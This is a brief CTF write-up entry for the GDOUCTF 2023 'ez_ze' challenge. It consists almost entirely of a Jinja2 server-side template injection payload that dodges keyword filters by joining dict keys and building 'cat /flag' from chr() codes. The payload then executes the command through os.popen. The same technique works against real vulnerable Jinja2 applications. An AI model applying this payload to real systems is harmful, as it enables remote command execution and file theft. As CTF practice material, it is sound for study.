
## GDOUCTF 2023 ez_ze
[SSTI绕过 | [GDOUCTF 2023]<ez_ze>](https://www.nssctf.cn/problem/3745) [参考文章](https://zhuanlan.zhihu.com/p/619441473)

可用payload：
```python
{%set fza1=dict(po=a,p=b)|join%}
{%set res=(lipsum|string|list)|attr(fza1)(24)%}
{%set fza2=(res,res,dict(globa=a,ls=b)|join,res,res)|join%}
{%set fza3=dict(o=a,s=b)|join%}
{%set fza4=dict(pope=a,n=b)|join%}
{%set fza5=dict(get=a)|join%}
{%set fza6=(res,res,dict(builtins=a)|join,res,res)|join %}
{%set fza7=dict(chr=a)|join%}
{%set char=(lipsum|attr(fza2))|attr(fza5)(fza6)|attr(fza5)(fza7)%}
{%set command=char(99)%2bchar(97)%2bchar(116)%2bchar(32)%2bchar(47)%2bchar(102)%2bchar(108)%2bchar(97)%2bchar(103)%}
{%set re=dict(rea=a,d=b)|join%}
{%set fuck=(lipsum|attr(fza2))|attr(fza5)(fza3)|attr(fza4)(command)|attr(re)()%}
{%print fuck%}
```